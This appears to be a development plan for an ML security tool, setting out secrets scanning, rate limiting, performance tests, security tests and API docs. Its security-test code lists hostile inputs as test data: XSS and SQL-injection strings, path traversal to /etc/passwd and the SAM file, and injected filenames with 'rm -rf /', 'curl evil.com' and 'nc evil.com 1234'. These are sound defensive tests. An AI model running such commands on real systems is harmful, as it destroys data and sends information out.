# Phase 2 Implementation Plan - P3 Issues

**Created:** November 29, 2025
**Status:** Ready to Execute
**Phase 1 Status:** ✅ COMPLETE (188/188 tests passing, 61.07% coverage)
**Estimated Total Time:** ~23 hours

---

## 📋 Table of Contents

1. [Overview](#overview)
2. [Pre-Implementation Checklist](#pre-implementation-checklist)
3. [Issue Implementation Order](#issue-implementation-order)
4. [Testing & Quality Gates](#testing--quality-gates)
5. [Issue-by-Issue Breakdown](#issue-by-issue-breakdown)
6. [Final Documentation Updates](#final-documentation-updates)
7. [Success Criteria](#success-criteria)

---

## 🎯 Overview

Phase 2 implements all P3 priority issues with comprehensive testing, linting, and import validation after each issue completion.

### Current State
- ✅ All 188 tests passing (100% pass rate)
- ✅ Coverage: 61.07%
- ✅ All P0, P1, P2 issues resolved
- ✅ Phase 1 complete

### Phase 2 Goals
- Complete all P3 issues (ISSUE-16 through ISSUE-21)
- Maintain 100% test pass rate throughout
- Run full quality checks after each issue
- Update documentation comprehensively at the end
- Achieve production-ready state

---

## ✅ Pre-Implementation Checklist

Before starting Phase 2, verify:

- [x] All Phase 1 tests passing (188/188)
- [x] Git working directory clean
- [x] Virtual environment activated (`mlvenv`)
- [x] All dependencies installed
- [ ] Create new branch: `git checkout -b phase2-p3-implementation`
- [ ] Baseline metrics captured

### Capture Baseline Metrics

```bash
# Save current test results
pytest tests/ --cov=src --cov-report=term --cov-report=json > baseline_tests.txt

# Save current coverage
cp coverage.json coverage_baseline.json

# Run linters baseline
ruff check src/ tests/ > baseline_ruff.txt || true
mypy src/ > baseline_mypy.txt || true
```

---

## 🔄 Issue Implementation Order

Issues will be implemented in this order for logical dependencies:

1. **ISSUE-21** - Secrets Scanning (1 hour) - Independent, blocks commits
2. **ISSUE-20** - Rate Limiting (2 hours) - Independent, app.py changes
3. **ISSUE-17** - Complete E2E Tests (4 hours) - Extends existing E2E framework
4. **ISSUE-18** - Performance Tests (4 hours) - Requires E2E tests complete
5. **ISSUE-19** - Security Testing (4 hours) - Can run after app changes
6. **ISSUE-16** - API Documentation (6 hours) - Last, documents all completed work

---

## 🧪 Testing & Quality Gates

**After completing EACH issue**, run this complete validation suite:

### Gate 1: Import Check
```bash
# Verify all imports work
python -c "import src.agent.tools; import src.agent.reasoning_chain; import src.security.cve_monitor; import src.dataset.bias_analyzer; import src.dataset.poisoning_detector; import src.utils.config; import src.utils.logger; import src.mcp.connectors; import src.security.threat_intel; import src.security.code_generator" && echo "✅ All imports successful" || echo "❌ Import errors detected"
```

### Gate 2: Linting
```bash
# Run Ruff linter
ruff check src/ tests/ --fix

# Run type checking
mypy src/ --ignore-missing-imports || echo "⚠️  Type check warnings (non-blocking)"
```

### Gate 3: Unit Tests
```bash
# Run all unit tests
pytest tests/ -v --tb=short --maxfail=5
```

### Gate 4: Coverage Check
```bash
# Generate coverage report
pytest tests/ --cov=src --cov-report=term-missing --cov-report=json

# Verify coverage hasn't decreased
python -c "
import json
with open('coverage.json') as f:
    current = json.load(f)['totals']['percent_covered']
with open('coverage_baseline.json') as f:
    baseline = json.load(f)['totals']['percent_covered']
print(f'Coverage: {current:.2f}% (baseline: {baseline:.2f}%)')
assert current >= baseline, f'Coverage decreased from {baseline:.2f}% to {current:.2f}%'
print('✅ Coverage maintained or improved')
"
```

### Gate 5: E2E Tests (after ISSUE-17)
```bash
# Run E2E tests separately for clarity
pytest tests/e2e/ -v
```

### Gate 6: Performance Tests (after ISSUE-18)
```bash
# Run performance tests
pytest tests/performance/ -v --benchmark-only
```

### Gate 7: Security Tests (after ISSUE-19)
```bash
# Run security tests
pytest tests/security/ -v

# Run bandit security scanner
bandit -r src/ -ll
```

### Complete Quality Gate Script

Save this as `scripts/quality_gate.sh`:

```bash
#!/bin/bash
set -e

echo "=========================================="
echo "Running Complete Quality Gate"
echo "=========================================="

echo ""
echo "Gate 1: Import Check..."
python -c "import src.agent.tools; import src.agent.reasoning_chain; import src.security.cve_monitor; import src.dataset.bias_analyzer; import src.dataset.poisoning_detector; import src.utils.config; import src.utils.logger; import src.mcp.connectors; import src.security.threat_intel; import src.security.code_generator" && echo "✅ All imports successful" || exit 1

echo ""
echo "Gate 2: Linting..."
ruff check src/ tests/ --fix
echo "✅ Linting complete"

echo ""
echo "Gate 3: Type Checking..."
mypy src/ --ignore-missing-imports || echo "⚠️  Type warnings (non-blocking)"

echo ""
echo "Gate 4: Unit Tests..."
pytest tests/ -v --tb=short --maxfail=5 || exit 1
echo "✅ All tests passing"

echo ""
echo "Gate 5: Coverage Check..."
pytest tests/ --cov=src --cov-report=term --cov-report=json > /dev/null
python -c "
import json
with open('coverage.json') as f:
    current = json.load(f)['totals']['percent_covered']
print(f'Coverage: {current:.2f}%')
print('✅ Coverage check complete')
"

echo ""
echo "=========================================="
echo "✅ All Quality Gates Passed!"
echo "=========================================="
```

Make it executable:
```bash
chmod +x scripts/quality_gate.sh
```

---

## 📝 Issue-by-Issue Breakdown

### **ISSUE-21: Secrets Scanning Pre-commit Hook** 🔐
**Priority:** P3
**Estimated Time:** 1 hour
**Status:** TODO
**Order:** 1st (blocks accidental commits of secrets)

#### Implementation Steps:

1. **Install detect-secrets** (5 min)
```bash
pip install detect-secrets
echo "detect-secrets" >> requirements-dev.txt
```

2. **Generate baseline** (10 min)
```bash
# Scan and create baseline
detect-secrets scan > .secrets.baseline

# Audit baseline (review and mark false positives)
detect-secrets audit .secrets.baseline
```

3. **Update pre-commit config** (10 min)
```yaml
# Add to .pre-commit-config.yaml
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.5.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']
        exclude: |
          (?x)^(
            package-lock.json|
            poetry.lock|
            .*\.ipynb|
            coverage\.json|
            \.secrets\.baseline
          )$
```

4. **Test the hook** (10 min)
```bash
# Install pre-commit hooks
pre-commit install

# Test with a fake secret
echo "AWS_KEY=AKIAIOSFODNN7EXAMPLE" >> test_file.txt
git add test_file.txt
git commit -m "Test secrets detection"  # Should fail

# Clean up
rm test_file.txt
```

5. **Update documentation** (15 min)
- Add section to CONTRIBUTING.md about secrets handling
- Document how to update baseline
- Document handling false positives

6. **Add to CI** (10 min)
```yaml
# Add to .github/workflows/python-tests.yml
- name: Detect Secrets
  run: |
    pip install detect-secrets
    detect-secrets scan --baseline .secrets.baseline
```

#### Testing Checklist:
- [ ] Pre-commit hook blocks commits with secrets
- [ ] Baseline file committed and tracked
- [ ] CI job catches secrets
- [ ] Documentation updated
- [ ] **RUN QUALITY GATES** ✅

#### Files Created/Modified:
- `.secrets.baseline` (new)
- `.pre-commit-config.yaml` (modified)
- `.github/workflows/python-tests.yml` (modified)
- `CONTRIBUTING.md` (modified)

---

### **ISSUE-20: Rate Limiting** ⏱️
**Priority:** P3
**Estimated Time:** 2 hours
**Status:** TODO
**Order:** 2nd (independent, app.py changes)

#### Implementation Steps:

1. **Research Gradio 5+ rate limiting** (15 min)
- Review Gradio 5.x docs for rate limiting APIs
- Check if built-in rate limiter exists
- Design fallback using Python decorators if needed

2. **Implement rate limiter** (45 min)

Create `src/utils/rate_limiter.py`:
```python
"""Rate limiting utilities for Gradio endpoints."""
from functools import wraps
from time import time
from typing import Dict, Callable, Any
import threading

class RateLimiter:
    """Simple in-memory rate limiter."""

    def __init__(self, max_calls: int, period: int):
        """
        Args:
            max_calls: Maximum number of calls allowed
            period: Time period in seconds
        """
        self.max_calls = max_calls
        self.period = period
        self.calls: Dict[str, list] = {}
        self.lock = threading.Lock()

    def is_allowed(self, key: str) -> bool:
        """Check if call is allowed for given key."""
        with self.lock:
            now = time()
            if key not in self.calls:
                self.calls[key] = []

            # Remove old calls outside the time window
            self.calls[key] = [t for t in self.calls[key] if now - t < self.period]

            if len(self.calls[key]) < self.max_calls:
                self.calls[key].append(now)
                return True
            return False

    def __call__(self, func: Callable) -> Callable:
        """Decorator to rate limit a function."""
        @wraps(func)
        def wrapper(*args, **kwargs) -> Any:
            # Use function name as key (could be improved with user ID)
            key = func.__name__

            if not self.is_allowed(key):
                return {
                    "status": "error",
                    "message": f"Rate limit exceeded. Maximum {self.max_calls} requests per {self.period} seconds. Please try again later."
                }

            return func(*args, **kwargs)
        return wrapper

# Create rate limiters for different endpoints
cve_search_limiter = RateLimiter(max_calls=10, period=60)  # 10/min
dataset_analysis_limiter = RateLimiter(max_calls=5, period=60)  # 5/min (heavy)
code_gen_limiter = RateLimiter(max_calls=20, period=60)  # 20/min
chat_limiter = RateLimiter(max_calls=30, period=60)  # 30/min
```

3. **Apply rate limiters to app.py** (30 min)
```python
# In app.py, import rate limiters
from src.utils.rate_limiter import (
    cve_search_limiter,
    dataset_analysis_limiter,
    code_gen_limiter,
    chat_limiter
)

# Apply decorators to functions
@cve_search_limiter
def search_cves_ui(library: str, days: int) -> str:
    ...

@dataset_analysis_limiter
def analyze_dataset_ui(file) -> str:
    ...

@code_gen_limiter
def generate_code_ui(description: str) -> str:
    ...

@chat_limiter
def chat_ui(message: str, history: list) -> tuple:
    ...
```

4. **Create tests** (30 min)

Create `tests/test_rate_limiting.py`:
```python
"""Tests for rate limiting."""
import time
import pytest
from src.utils.rate_limiter import RateLimiter

class TestRateLimiter:
    def test_allows_within_limit(self):
        limiter = RateLimiter(max_calls=5, period=10)
        for _ in range(5):
            assert limiter.is_allowed("test_key") is True

    def test_blocks_over_limit(self):
        limiter = RateLimiter(max_calls=3, period=10)
        for _ in range(3):
            limiter.is_allowed("test_key")
        assert limiter.is_allowed("test_key") is False

    def test_resets_after_period(self):
        limiter = RateLimiter(max_calls=2, period=1)
        limiter.is_allowed("test_key")
        limiter.is_allowed("test_key")
        assert limiter.is_allowed("test_key") is False
        time.sleep(1.1)
        assert limiter.is_allowed("test_key") is True

    def test_decorator(self):
        limiter = RateLimiter(max_calls=2, period=10)

        @limiter
        def test_func():
            return "success"

        assert test_func() == "success"
        assert test_func() == "success"
        result = test_func()
        assert isinstance(result, dict)
        assert result["status"] == "error"
        assert "rate limit" in result["message"].lower()
```

#### Testing Checklist:
- [ ] Rate limiter tests pass
- [ ] Each endpoint has appropriate limits
- [ ] Error messages are user-friendly
- [ ] Limits reset correctly
- [ ] **RUN QUALITY GATES** ✅

#### Files Created/Modified:
- `src/utils/rate_limiter.py` (new)
- `app.py` (modified)
- `tests/test_rate_limiting.py` (new)

---

### **ISSUE-17: Complete E2E Tests** 🔄
**Priority:** P3
**Estimated Time:** 4 hours
**Status:** PARTIAL (2 of 5 workflows done)
**Order:** 3rd (extends existing E2E framework)

#### Current Status:
- ✅ CVE workflow E2E tests (5 tests)
- ✅ Dataset workflow E2E tests (16 tests)
- ❌ Code generation workflow tests (0 tests)
- ❌ Multi-step agent reasoning tests (0 tests)

#### Implementation Steps:

1. **Create code generation workflow tests** (2 hours)

Create `tests/e2e/test_code_generation_workflow.py`:
```python
"""E2E tests for security code generation workflow."""
import pytest
import json
from unittest.mock import patch, Mock
from src.agent.tools import generate_security_code_impl

class TestCodeGenerationWorkflow:
    """E2E tests for complete code generation workflow."""

    @patch("src.agent.tools.build_general_security_script")
    def test_complete_code_generation_workflow(self, mock_build):
        """Test complete code generation workflow."""
        mock_build.return_value = "# Generated validation code\ndef validate():\n    pass"

        result_json = generate_security_code_impl(
            description="Create input validation for user email",
            language="python"
        )
        result = json.loads(result_json)

        assert result["status"] == "success"
        assert "code" in result
        assert "def validate" in result["code"]

    @patch("src.agent.tools.build_cve_security_script")
    def test_cve_specific_code_generation(self, mock_build):
        """Test CVE-specific code generation."""
        mock_build.return_value = "# CVE mitigation code\ndef check_version():\n    pass"

        result_json = generate_security_code_impl(
            description="Validate NumPy version for CVE-2024-1234",
            language="python",
            cve_id="CVE-2024-1234"
        )
        result = json.loads(result_json)

        assert result["status"] == "success"
        assert "CVE" in result["code"] or "version" in result["code"].lower()

    def test_code_generation_with_invalid_language(self):
        """Test error handling for unsupported language."""
        result_json = generate_security_code_impl(
            description="Test",
            language="brainfuck"
        )
        result = json.loads(result_json)

        # Should either error or default to Python
        assert "status" in result

    def test_code_generation_includes_error_handling(self):
        """Test generated code includes error handling."""
        result_json = generate_security_code_impl(
            description="Validate API key format",
            language="python"
        )
        result = json.loads(result_json)

        if result["status"] == "success":
            code = result["code"]
            # Check for common error handling patterns
            has_error_handling = any(
                keyword in code for keyword in ["try", "except", "raise", "if", "assert"]
            )
            assert has_error_handling, "Generated code should include error handling"

    # Add more tests...
```

2. **Create multi-step agent reasoning tests** (2 hours)

Create `tests/e2e/test_agent_reasoning.py`:
```python
"""E2E tests for multi-step agent reasoning workflows."""
import pytest
from unittest.mock import patch, Mock
from langchain_core.messages import AIMessage

class TestAgentReasoningWorkflow:
    """E2E tests for complex agent reasoning."""

    @patch("src.agent.reasoning_chain.get_llm")
    def test_multi_tool_workflow(self, mock_get_llm):
        """Test agent uses multiple tools in sequence."""
        # Mock LLM to return tool calls
        mock_llm = Mock()
        mock_response = AIMessage(
            content="I'll check for CVEs first, then analyze the dataset",
            tool_calls=[
                {
                    "name": "search_cves",
                    "args": {"library": "pandas", "days_back": 30},
                    "id": "call_1"
                },
                {
                    "name": "analyze_dataset",
                    "args": {"data_path": "/path/to/data.csv"},
                    "id": "call_2"
                }
            ]
        )
        mock_llm.invoke.return_value = mock_response
        mock_get_llm.return_value = mock_llm

        # Test multi-step reasoning
        # (Implementation depends on your agent architecture)
        # This is a skeleton - adjust based on actual agent API

        # Verify correct tool selection
        # Verify proper sequencing
        # Verify results aggregation

    # Add more complex reasoning tests...
```

#### Testing Checklist:
- [ ] Code generation tests pass (10+ tests)
- [ ] Agent reasoning tests pass (5+ tests)
- [ ] All E2E tests pass together
- [ ] Coverage increased
- [ ] **RUN QUALITY GATES** ✅

#### Files Created/Modified:
- `tests/e2e/test_code_generation_workflow.py` (new)
- `tests/e2e/test_agent_reasoning.py` (new)

---

### **ISSUE-18: Performance Tests** ⚡
**Priority:** P3
**Estimated Time:** 4 hours
**Status:** TODO
**Order:** 4th (requires E2E tests complete)

#### Implementation Steps:

1. **Install performance testing tools** (10 min)
```bash
pip install pytest-benchmark memory-profiler
echo "pytest-benchmark" >> requirements-dev.txt
echo "memory-profiler" >> requirements-dev.txt
```

2. **Create performance test structure** (20 min)
```bash
mkdir -p tests/performance
```

Create `tests/performance/conftest.py`:
```python
"""Fixtures for performance tests."""
import pytest
import pandas as pd
import numpy as np

@pytest.fixture
def small_dataset():
    """100 rows."""
    return pd.DataFrame({
        f"feature{i}": np.random.randn(100)
        for i in range(10)
    })

@pytest.fixture
def medium_dataset():
    """10,000 rows."""
    return pd.DataFrame({
        f"feature{i}": np.random.randn(10000)
        for i in range(10)
    })

@pytest.fixture
def large_dataset():
    """100,000 rows."""
    return pd.DataFrame({
        f"feature{i}": np.random.randn(100000)
        for i in range(10)
    })
```

3. **Create dataset performance tests** (1.5 hours)

Create `tests/performance/test_dataset_performance.py`:
```python
"""Performance tests for dataset analysis."""
import pytest
from src.agent.tools import analyze_dataset_impl
import json

class TestDatasetPerformance:
    def test_small_dataset_performance(self, benchmark, small_dataset, tmp_path):
        """Small dataset should complete in < 1 second."""
        path = tmp_path / "small.csv"
        small_dataset.to_csv(path, index=False)

        result = benchmark(lambda: analyze_dataset_impl(data_path=str(path)))

        # Verify it completed
        data = json.loads(result)
        assert data["status"] == "success"

        # Check benchmark (pytest-benchmark tracks automatically)
        assert benchmark.stats.mean < 1.0  # < 1 second

    def test_medium_dataset_performance(self, benchmark, medium_dataset, tmp_path):
        """Medium dataset should complete in < 5 seconds."""
        path = tmp_path / "medium.csv"
        medium_dataset.to_csv(path, index=False)

        result = benchmark(lambda: analyze_dataset_impl(data_path=str(path)))

        data = json.loads(result)
        assert data["status"] == "success"
        assert benchmark.stats.mean < 5.0  # < 5 seconds

    def test_large_dataset_performance(self, benchmark, large_dataset, tmp_path):
        """Large dataset should complete in < 30 seconds."""
        path = tmp_path / "large.csv"
        large_dataset.to_csv(path, index=False)

        result = benchmark(lambda: analyze_dataset_impl(data_path=str(path)))

        data = json.loads(result)
        assert data["status"] == "success"
        assert benchmark.stats.mean < 30.0  # < 30 seconds

    # Memory profiling test
    def test_large_dataset_memory_usage(self, large_dataset, tmp_path):
        """Verify memory usage stays reasonable."""
        from memory_profiler import memory_usage

        path = tmp_path / "large.csv"
        large_dataset.to_csv(path, index=False)

        mem_usage = memory_usage(
            (analyze_dataset_impl, (str(path),)),
            max_usage=True
        )

        # Should use less than 500MB
        assert mem_usage < 500  # MB
```

4. **Create CVE search performance tests** (1 hour)

Create `tests/performance/test_cve_performance.py`:
```python
"""Performance tests for CVE search."""
import pytest
from unittest.mock import patch, Mock
from src.security.cve_monitor import CVEMonitor

class TestCVEPerformance:
    @patch("src.security.cve_monitor.requests.Session")
    def test_single_search_performance(self, mock_session, benchmark):
        """Single CVE search should complete in < 2 seconds."""
        mock_response = Mock()
        mock_response.json.return_value = {"vulnerabilities": []}
        mock_session.return_value.get.return_value = mock_response

        monitor = CVEMonitor()

        result = benchmark(lambda: monitor.search_recent("tensorflow", 90))

        assert benchmark.stats.mean < 2.0  # < 2 seconds

    # Add caching tests...
```

5. **Create benchmark comparison script** (30 min)
```bash
# scripts/run_benchmarks.sh
#!/bin/bash
pytest tests/performance/ --benchmark-only --benchmark-json=benchmark_results.json
```

6. **Add performance regression detection** (40 min)
```yaml
# Add to .github/workflows/python-tests.yml
performance:
  runs-on: ubuntu-latest
  steps:
    - uses: actions/checkout@v4
    - uses: actions/setup-python@v5
      with:
        python-version: '3.13'
    - name: Install dependencies
      run: |
        pip install -r requirements.txt
        pip install -r requirements-dev.txt
    - name: Run performance benchmarks
      run: pytest tests/performance/ --benchmark-only --benchmark-json=benchmark.json
    - name: Store benchmark result
      uses: benchmark-action/github-action-benchmark@v1
      with:
        tool: 'pytest'
        output-file-path: benchmark.json
        github-token: ${{ secrets.GITHUB_TOKEN }}
        auto-push: true
```

#### Testing Checklist:
- [ ] Small dataset benchmark passes
- [ ] Medium dataset benchmark passes
- [ ] Large dataset benchmark passes
- [ ] Memory usage reasonable
- [ ] CVE search benchmark passes
- [ ] Benchmark results stored
- [ ] **RUN QUALITY GATES** ✅

#### Files Created/Modified:
- `tests/performance/conftest.py` (new)
- `tests/performance/test_dataset_performance.py` (new)
- `tests/performance/test_cve_performance.py` (new)
- `scripts/run_benchmarks.sh` (new)
- `.github/workflows/python-tests.yml` (modified)
- `requirements-dev.txt` (modified)

---

### **ISSUE-19: Security Testing** 🔒
**Priority:** P3
**Estimated Time:** 4 hours
**Status:** TODO
**Order:** 5th (can run after app changes)

#### Implementation Steps:

1. **Install security testing tools** (10 min)
```bash
pip install bandit safety
echo "bandit[toml]" >> requirements-dev.txt
echo "safety" >> requirements-dev.txt
```

2. **Create security test structure** (10 min)
```bash
mkdir -p tests/security
```

3. **Create input validation security tests** (1.5 hours)

Create `tests/security/test_input_validation.py`:
```python
"""Security tests for input validation."""
import pytest
from src.agent.tools import (
    search_cves_impl,
    analyze_dataset_impl,
    generate_security_code_impl
)
import json

class TestInputValidationSecurity:
    """Test XSS, injection, and malicious input handling."""

    def test_xss_in_query_string(self):
        """Test XSS attempts in queries are handled safely."""
        malicious_inputs = [
            "<script>alert('XSS')</script>",
            "'; DROP TABLE users; --",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='evil.com'></iframe>",
        ]

        for malicious in malicious_inputs:
            result = search_cves_impl(library=malicious, days_back=30)
            data = json.loads(result)

            # Should not crash
            assert "status" in data

            # Should sanitize output
            if "library" in data:
                assert "<script>" not in str(data)
                assert "javascript:" not in str(data)

    def test_path_traversal_in_file_upload(self):
        """Test path traversal attempts are blocked."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
        ]

        for malicious in malicious_paths:
            result = analyze_dataset_impl(data_path=malicious)
            data = json.loads(result)

            # Should error safely without exposing system
            assert data["status"] == "error"
            assert "etc/passwd" not in str(data).lower()
            assert "windows" not in str(data).lower()

    def test_command_injection_in_filenames(self):
        """Test command injection attempts in filenames."""
        malicious_filenames = [
            "data.csv; rm -rf /",
            "data.csv && curl evil.com",
            "data.csv | nc evil.com 1234",
            "$(whoami).csv",
            "`ls -la`.csv",
        ]

        for malicious in malicious_filenames:
            result = analyze_dataset_impl(data_path=malicious)
            data = json.loads(result)

            # Should error without executing commands
            assert data["status"] == "error"

    def test_large_file_dos(self, tmp_path):
        """Test oversized file handling."""
        # Create a file larger than reasonable (e.g., 1GB)
        # This is a mock test - actual file creation would be slow
        # In practice, check file size before processing
        pass

    # Add more security tests...
```

4. **Create code generation security tests** (1 hour)

Create `tests/security/test_code_generation_security.py`:
```python
"""Security tests for generated code."""
import pytest
from src.agent.tools import generate_security_code_impl
import json
import re

class TestCodeGenerationSecurity:
    """Test generated code is secure."""

    def test_no_hardcoded_credentials(self):
        """Generated code should not contain hardcoded credentials."""
        result = generate_security_code_impl(
            description="Create database connection",
            language="python"
        )
        data = json.loads(result)

        if data["status"] == "success":
            code = data["code"]

            # Check for common credential patterns
            patterns = [
                r"password\s*=\s*['\"][^'\"]+['\"]",
                r"api_key\s*=\s*['\"][^'\"]+['\"]",
                r"secret\s*=\s*['\"][^'\"]+['\"]",
            ]

            for pattern in patterns:
                matches = re.findall(pattern, code, re.IGNORECASE)
                # Should use environment variables or config instead
                assert len(matches) == 0 or all(
                    "os.getenv" in code or "config" in code
                )

    def test_no_eval_exec(self):
        """Generated code should not use eval/exec."""
        result = generate_security_code_impl(
            description="Parse user input",
            language="python"
        )
        data = json.loads(result)

        if data["status"] == "success":
            code = data["code"]
            assert "eval(" not in code
            assert "exec(" not in code
            assert "__import__" not in code

    def test_includes_input_validation(self):
        """Generated validation code should include checks."""
        result = generate_security_code_impl(
            description="Validate user email",
            language="python"
        )
        data = json.loads(result)

        if data["status"] == "success":
            code = data["code"]
            # Should include validation logic
            has_validation = any(
                keyword in code for keyword in ["if", "assert", "raise", "check", "validate"]
            )
            assert has_validation

    # Add more security tests...
```

5. **Create API security tests** (1 hour)

Create `tests/security/test_api_security.py`:
```python
"""Security tests for API key handling."""
import pytest
import os
from unittest.mock import patch
from src.security.cve_monitor import CVEMonitor
from src.utils.config import get_settings, refresh_settings

class TestAPIKeySecurity:
    """Test API keys are handled securely."""

    def test_api_keys_not_logged(self, caplog):
        """API keys should not appear in logs."""
        os.environ["ANTHROPIC_API_KEY"] = "sk-test-secret-key-1234"
        refresh_settings()

        # Perform some operation that might log
        settings = get_settings()

        # Check logs don't contain the key
        for record in caplog.records:
            assert "sk-test-secret-key" not in record.message
            assert "secret-key-1234" not in record.message

    def test_api_keys_not_in_errors(self):
        """API keys should not appear in error messages."""
        os.environ["NVD_API_KEY"] = "test-nvd-key-12345"

        monitor = CVEMonitor(api_key="test-nvd-key-12345")

        # Trigger an error somehow
        # Check error message doesn't contain key

    # Add more API security tests...
```

6. **Configure bandit security scanner** (20 min)
```toml
# Add to pyproject.toml
[tool.bandit]
exclude_dirs = ["tests", "venv", "mlvenv"]
skips = ["B101"]  # Skip assert_used (common in tests)
```

7. **Add security scanning to CI** (30 min)
```yaml
# Add to .github/workflows/python-tests.yml
security:
  runs-on: ubuntu-latest
  steps:
    - uses: actions/checkout@v4
    - uses: actions/setup-python@v5
      with:
        python-version: '3.13'
    - name: Install dependencies
      run: |
        pip install bandit safety
    - name: Run Bandit security scanner
      run: bandit -r src/ -ll -f json -o bandit-report.json
    - name: Run Safety dependency checker
      run: safety check --json
    - name: Upload security reports
      uses: actions/upload-artifact@v4
      if: always()
      with:
        name: security-reports
        path: bandit-report.json
```

#### Testing Checklist:
- [ ] Input validation tests pass (10+ tests)
- [ ] Code generation security tests pass (5+ tests)
- [ ] API security tests pass (5+ tests)
- [ ] Bandit scanner passes
- [ ] Safety checker passes
- [ ] Security CI job configured
- [ ] **RUN QUALITY GATES** ✅

#### Files Created/Modified:
- `tests/security/test_input_validation.py` (new)
- `tests/security/test_code_generation_security.py` (new)
- `tests/security/test_api_security.py` (new)
- `pyproject.toml` (modified)
- `.github/workflows/python-tests.yml` (modified)
- `requirements-dev.txt` (modified)

---

### **ISSUE-16: API Documentation Generation** 📚
**Priority:** P3
**Estimated Time:** 6 hours
**Status:** TODO
**Order:** 6th (last, documents all completed work)

#### Implementation Steps:

1. **Install Sphinx and extensions** (15 min)
```bash
pip install sphinx sphinx-rtd-theme sphinx-autodoc-typehints
echo "sphinx" >> requirements-dev.txt
echo "sphinx-rtd-theme" >> requirements-dev.txt
echo "sphinx-autodoc-typehints" >> requirements-dev.txt
```

2. **Initialize Sphinx** (30 min)
```bash
mkdir -p docs
cd docs
sphinx-quickstart
```

Configure `docs/conf.py`:
```python
import os
import sys
sys.path.insert(0, os.path.abspath('..'))

project = 'MLPatrol'
copyright = '2025, MLPatrol Team'
author = 'MLPatrol Team'

extensions = [
    'sphinx.ext.autodoc',
    'sphinx.ext.napoleon',
    'sphinx.ext.viewcode',
    'sphinx.ext.intersphinx',
    'sphinx_autodoc_typehints',
]

templates_path = ['_templates']
exclude_patterns = ['_build', 'Thumbs.db', '.DS_Store']

html_theme = 'sphinx_rtd_theme'
html_static_path = ['_static']

# Napoleon settings
napoleon_google_docstring = True
napoleon_numpy_docstring = True
napoleon_include_init_with_doc = True

# Intersphinx mapping
intersphinx_mapping = {
    'python': ('https://docs.python.org/3', None),
    'pandas': ('https://pandas.pydata.org/docs/', None),
    'numpy': ('https://numpy.org/doc/stable/', None),
}
```

3. **Create documentation structure** (1 hour)

Create `docs/index.rst`:
```rst
MLPatrol Documentation
======================

MLPatrol is an AI-powered security analysis tool for ML projects.

.. toctree::
   :maxdepth: 2
   :caption: Contents:

   usage/quickstart
   usage/examples
   api/index

Indices and tables
==================

* :ref:`genindex`
* :ref:`modindex`
* :ref:`search`
```

Create `docs/api/index.rst`:
```rst
API Reference
=============

.. toctree::
   :maxdepth: 2

   agent
   dataset
   security
   utils
   mcp
```

Create module docs (e.g., `docs/api/agent.rst`):
```rst
Agent Module
============

.. automodule:: src.agent.tools
   :members:
   :undoc-members:
   :show-inheritance:

.. automodule:: src.agent.reasoning_chain
   :members:
   :undoc-members:
   :show-inheritance:

.. automodule:: src.agent.prompts
   :members:
   :undoc-members:
   :show-inheritance:
```

4. **Add/improve docstrings** (2.5 hours)
- Review all public functions
- Add Google-style docstrings where missing
- Include examples for complex functions

5. **Build documentation** (30 min)
```bash
cd docs
make html
```

Test locally:
```bash
python -m http.server --directory _build/html 8000
# Open http://localhost:8000
```

6. **Set up GitHub Pages deployment** (1 hour)

Create `.github/workflows/docs.yml`:
```yaml
name: Documentation

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.13'
      - name: Install dependencies
        run: |
          pip install sphinx sphinx-rtd-theme sphinx-autodoc-typehints
          pip install -r requirements.txt
      - name: Build documentation
        run: |
          cd docs
          make html
      - name: Deploy to GitHub Pages
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        uses: peaceiris/actions-gh-pages@v3
        with:
          github_token: ${{ secrets.GITHUB_TOKEN }}
          publish_dir: ./docs/_build/html
```

7. **Update README** (30 min)
```markdown
## Documentation

Full API documentation available at: https://[your-username].github.io/MLPatrol/

### Building Docs Locally

```bash
cd docs
make html
python -m http.server --directory _build/html 8000
```
```

#### Testing Checklist:
- [ ] Sphinx builds without errors
- [ ] All modules documented
- [ ] API reference complete
- [ ] Examples render correctly
- [ ] Cross-references work
- [ ] GitHub Pages deployment configured
- [ ] README updated with docs link
- [ ] **RUN QUALITY GATES** ✅

#### Files Created/Modified:
- `docs/conf.py` (new)
- `docs/index.rst` (new)
- `docs/api/*.rst` (new, multiple files)
- `docs/usage/*.rst` (new, multiple files)
- `.github/workflows/docs.yml` (new)
- `README.md` (modified)
- Various source files with improved docstrings
- `requirements-dev.txt` (modified)

---

## 📄 Final Documentation Updates

After ALL issues complete and ALL tests pass, update documentation comprehensively:

### 1. Update CHANGELOG.md (30 min)

```markdown
## [Unreleased]

### Added
- Rate limiting for all API endpoints (ISSUE-20)
- Secrets detection pre-commit hook (ISSUE-21)
- Complete E2E test suite for all workflows (ISSUE-17)
- Performance benchmarking suite (ISSUE-18)
- Security testing suite (ISSUE-19)
- Full API documentation with Sphinx (ISSUE-16)
- GitHub Pages deployment for documentation

### Changed
- Improved test coverage from 61.07% to XX%
- Enhanced security posture with multiple validation layers
- Performance baselines established and monitored

### Fixed
- All Phase 1 test failures resolved
- Logger configuration persistence issues
- Config cache test flakiness
- Outlier detection E2E test stability
```

### 2. Update README.md (30 min)

Add sections for:
- Link to documentation
- Performance benchmarks
- Security features
- Rate limiting information
- Testing coverage badge

### 3. Update TODO_FIXES.md (15 min)

Mark all P3 issues as complete with:
- Completion date
- Time spent
- Files modified
- Test results

### 4. Create PHASE2_COMPLETION_SUMMARY.md (1 hour)

Comprehensive summary including:
- All issues completed
- Test metrics (before/after)
- Coverage improvements
- Performance benchmarks
- Security enhancements
- Documentation links
- Next steps/future work

### 5. Update pyproject.toml metadata (15 min)

Ensure all fields are correct:
- Version number
- Description
- Keywords
- Classifiers
- URLs

---

## ✅ Success Criteria

Phase 2 is complete when:

### Testing
- [x] All 188 baseline tests still passing
- [ ] All new tests passing (50+ new tests expected)
- [ ] Total test count: 238+
- [ ] Pass rate: 100%
- [ ] Coverage: 65%+ (target)
- [ ] No regressions

### Quality Gates
- [ ] All imports work
- [ ] Ruff linter passes
- [ ] mypy type checking passes (or acceptable warnings)
- [ ] Bandit security scanner passes
- [ ] Safety dependency checker passes
